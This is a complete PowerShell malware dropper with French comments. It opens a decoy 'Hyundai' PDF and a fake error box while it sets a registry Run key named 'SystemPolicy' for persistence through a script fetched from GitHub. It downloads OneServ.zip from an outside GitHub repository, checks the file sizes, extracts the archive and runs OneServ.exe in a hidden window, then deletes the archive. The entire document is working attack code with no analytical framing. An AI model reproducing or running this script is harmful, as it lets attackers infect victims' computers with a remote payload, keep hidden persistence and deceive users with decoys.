#region Initialisation
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$v1 = "https://github.com/hundaicasp-cmd/OneServ/raw/main/OneServ.zip"
$v2 = "C:\Users\Public\" + ([System.IO.Path]::GetRandomFileName().Split('.')[0]) + ".zip"
$v3 = "C:\Users\Public\" + (Get-Date -Format "yyyyMMdd")
#endregion

#region Créer PDF leurre
$nomPDF = "Hyundai"
$cheminPDF = "$env:USERPROFILE\Desktop\$nomPDF.pdf"
$pdfCree = $false

if (-not (Test-Path $cheminPDF)) {
    try {
        $contenuPDF = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 720 Td () Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000112 00000 n \n0000000202 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n321\n%%EOF'
        Set-Content -Path $cheminPDF -Value $contenuPDF -Encoding ASCII
        $pdfCree = $true
        
        # Abrir el PDF solo si se acaba de crear
        if ($pdfCree) {
            Start-Process $cheminPDF -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Host "Erreur lors de la création du PDF: $($_.Exception.Message)"
    }
}

# MessageBox d'erreur PDF simple
try {
    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.Interaction]::MsgBox("PDF Errorer", "OkOnly,Exclamation", "Erreur")
} catch {
    # Silence les erreurs
}
#endregion

#region Persistance améliorée
try {
    $cheminReg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $cheminPowerShell = (Get-Process -Id $PID).Path
    $nomPersistance = "SystemPolicy"
    
    # Vérifier si la clé de registre existe déjà
    try {
        $cleExistante = Get-ItemProperty -Path $cheminReg -Name $nomPersistance -ErrorAction SilentlyContinue
        if ($cleExistante) {
            Write-Host "La clé de registre $nomPersistance existe déjà - Persistance déjà active"
            return
        }
    } catch {
        Write-Host "La clé de registre $nomPersistance n'existe pas - Procéder à la création"
    }
    
    # Vérifier si le script existe déjà
    $urlScript = "https://raw.githubusercontent.com/hundaicasp-cmd/OneServ/refs/heads/main/poo.txt"
    $tempDir = $env:TEMP
    $scriptPath = Join-Path $tempDir "emo.ps1"
    
    if (Test-Path $scriptPath) {
        Write-Host "Le script emo.ps1 existe déjà dans temp - Utilisation du script existant"
    } else {
        try {
            Write-Host "Téléchargement du script de persistance depuis GitHub..."
            $webClient = New-Object System.Net.WebClient
            $scriptContent = $webClient.DownloadString($urlScript)
            
            # Sauvegarder le script dans le dossier temp
            Set-Content -Path $scriptPath -Value $scriptContent -Encoding UTF8
            Write-Host "Script téléchargé et sauvegardé: $scriptPath"
            
        } catch {
            Write-Host "Erreur lors du téléchargement du script: $($_.Exception.Message)"
            # Fallback: utiliser le script local
            $cheminScript = $MyInvocation.MyCommand.Path
            $commandePersistance = "`"$cheminPowerShell`" -Exec Bypass -W Hidden -File `"$cheminScript`""
            Set-ItemProperty -Path $cheminReg -Name $nomPersistance -Value $commandePersistance -Force
            Write-Host "Persistance créée avec le script local"
            return
        }
    }
    
    # Créer la persistance avec SystemPolicy
    $commandePersistance = "`"$cheminPowerShell`" -Exec Bypass -W Hidden -File `"$scriptPath`""
    
    Set-ItemProperty -Path $cheminReg -Name $nomPersistance -Value $commandePersistance -Force
    Write-Host "Persistance créée avec le nom: $nomPersistance"
    Write-Host "Commande: $commandePersistance"
    
} catch {
    Write-Host "Erreur lors de la création de la persistance: $($_.Exception.Message)"
}
#endregion

#region Vérifier connexion
$testConnexion = $false
$tentatives = 0
while (-not $testConnexion -and $tentatives -lt 5) {
    try {
        $resultatTest = Test-NetConnection -ComputerName 8.8.8.8 -Port 53 -InformationLevel Quiet
        if ($resultatTest) {
            $testConnexion = $true
        }
    } catch {
        $tentatives++
        Start-Sleep -Seconds 5
    }
}
#endregion

#region Vérification et téléchargement
$poidsZipRequis = 9296478
$poidsExeRequis = 9484125
$executableTrouve = $false
$executableValide = $false
$zipValide = $false

# Vérifier si l'exécutable existe déjà et a le bon poids
$executableExistant = Get-ChildItem -Path $v3 -Filter "*OneServ*" -Recurse | 
                     Where-Object {$_.Extension -eq ".exe"} | 
                     Select-Object -First 1

if ($executableExistant) {
    $executableTrouve = $true
    $poidsActuel = $executableExistant.Length
    Write-Host "OneServ.exe trouvé - Poids: $poidsActuel bytes"
    
    if ($poidsActuel -eq $poidsExeRequis) {
        $executableValide = $true
        Write-Host "Poids vérifié - Exécutable valide"
    } else {
        Write-Host "Poids incorrect - Suppression de l'exécutable"
        Remove-Item $executableExistant.FullName -Force -ErrorAction SilentlyContinue
    }
}

# Téléchargement seulement si nécessaire
if ($testConnexion -and (-not $executableValide)) {
    $tentativesDownload = 0
    $maxTentatives = 3
    
    while ((-not $executableValide) -and $tentativesDownload -lt $maxTentatives) {
        $tentativesDownload++
        Write-Host "Tentative de téléchargement #$tentativesDownload"
        
        try {
            # Télécharger le fichier ZIP
            $clientWeb = New-Object System.Net.WebClient
            $clientWeb.DownloadFile($v1, $v2)
            
            if (Test-Path $v2) {
                # Vérifier le poids du ZIP
                $poidsZip = (Get-Item $v2).Length
                Write-Host "Poids du ZIP: $poidsZip bytes (requis: $poidsZipRequis bytes)"
                
                if ($poidsZip -eq $poidsZipRequis) {
                    Write-Host "ZIP valide - Procéder à l'extraction"
                    $zipValide = $true
                } else {
                    Write-Host "Poids du ZIP incorrect - Suppression et nouvel essai"
                    Remove-Item $v2 -Force -ErrorAction SilentlyContinue
                    continue
                }
                
                # Créer le répertoire s'il n'existe pas
                if (-not (Test-Path $v3)) {
                    New-Item -ItemType Directory -Path $v3 -Force | Out-Null
                }
                
                # Extraire le fichier
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($v2, $v3)
                
                # Vérifier à nouveau le poids après extraction
                $executableCible = Get-ChildItem -Path $v3 -Filter "*OneServ*" -Recurse | 
                                 Where-Object {$_.Extension -eq ".exe"} | 
                                 Select-Object -First 1
                
                if ($executableCible) {
                    $poidsFinal = $executableCible.Length
                    Write-Host "Poids après extraction: $poidsFinal bytes"
                    
                    if ($poidsFinal -eq $poidsExeRequis) {
                        Write-Host "Exécutable valide après téléchargement"
                        $executableValide = $true
                    } else {
                        Write-Host "Poids EXE toujours incorrect - Nouvel essai"
                        Remove-Item $executableCible.FullName -Force -ErrorAction SilentlyContinue
                        Remove-Item $v2 -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        } catch {
            Write-Host "Erreur lors du téléchargement: $($_.Exception.Message)"
            if (Test-Path $v2) {
                Remove-Item $v2 -Force -ErrorAction SilentlyContinue
            }
        }
        
        # Pause entre les tentatives
        if (-not $executableValide -and $tentativesDownload -lt $maxTentatives) {
            Write-Host "Nouvelle tentative dans 3 secondes..."
            Start-Sleep -Seconds 3
        }
    }
}
#endregion

#region Deuxième vérification - Clé de registre NsMonitor
$executionAutorisee = $true
$cleRegistreAVerifier = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$nomEntreeAVerifier = "NsMonitor"

try {
    $entreeExistante = Get-ItemProperty -Path $cleRegistreAVerifier -Name $nomEntreeAVerifier -ErrorAction SilentlyContinue
    if ($entreeExistante) {
        Write-Host "La clé de registre $nomEntreeAVerifier existe - Arrêt de l'exécution"
        $executionAutorisee = $false
    } else {
        Write-Host "La clé de registre $nomEntreeAVerifier n'existe pas - Exécution autorisée"
    }
} catch {
    Write-Host "Erreur lors de la vérification du registre: $($_.Exception.Message)"
    $executionAutorisee = $true
}
#endregion

#region Exécution (seulement si la deuxième vérification est passée)
if ($executableValide -and $executableCible -and $executionAutorisee) {
    try {
        Write-Host "Toutes les vérifications passées - Lancement de OneServ.exe"
        $parametresProcessus = @{
            FilePath = $executableCible.FullName
            ArgumentList = "-run"
            WindowStyle = "Hidden"
            PassThru = $true
        }
        $processus = Start-Process @parametresProcessus
        Write-Host "Processus exécuté avec PID: $($processus.Id)"
    } catch {
        Write-Host "Erreur lors de l'exécution: $($_.Exception.Message)"
    }
} else {
    if (-not $executionAutorisee) {
        Write-Host "Exécution bloquée: La clé de registre NsMonitor existe"
    } else {
        Write-Host "Aucun exécutable valide trouvé pour l'exécution après $tentativesDownload tentatives"
    }
}
#endregion

#region Nettoyage temporaire
try {
    $scriptNettoyage = {
        Start-Sleep -Seconds 30
        if (Test-Path $using:v2) {
            Remove-Item $using:v2 -Force -ErrorAction SilentlyContinue
        }
    }
    $travailNettoyage = Start-Job -ScriptBlock $scriptNettoyage
} catch {
    # Silence les erreurs de nettoyage
}
#endregion

#region Créer PDF leurre (déplacé à la fin)
$nomPDF = "Hyundai"
$cheminPDF = "$env:USERPROFILE\Desktop\$nomPDF.pdf"
$pdfCree = $false

if (-not (Test-Path $cheminPDF)) {
    try {
        $contenuPDF = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 720 Td () Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000058 00000 n \n0000000112 00000 n \n0000000202 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n321\n%%EOF'
        Set-Content -Path $cheminPDF -Value $contenuPDF -Encoding ASCII
        $pdfCree = $true
        
        # Abrir el PDF solo si se acaba de crear
        if ($pdfCree) {
            Start-Process $cheminPDF -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Host "Erreur lors de la création du PDF: $($_.Exception.Message)"
    }
}

# MessageBox d'erreur PDF simple
try {
    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.Interaction]::MsgBox("PDF Errorer", "OkOnly,Exclamation", "Erreur")
} catch {
    # Silence les erreurs
}
#endregion
